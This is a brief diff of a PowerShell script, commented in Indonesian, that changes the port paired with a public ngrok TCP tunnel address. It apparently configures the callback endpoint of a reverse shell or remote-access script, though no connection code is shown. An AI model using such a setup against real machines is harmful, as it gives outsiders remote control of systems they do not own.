@@ -1,6 +1,6 @@
 # Tentukan IP dan Port yang digunakan secara langsung
 $l = "0.tcp.ap.ngrok.io"  # Ganti dengan alamat ngrok
-$p = 11794                # Ganti dengan port ngrok
+$p = 17005                # Ganti dengan port ngrok
 
 # Pastikan IP dan Port valid
 if (-not $l -or -not $p) {
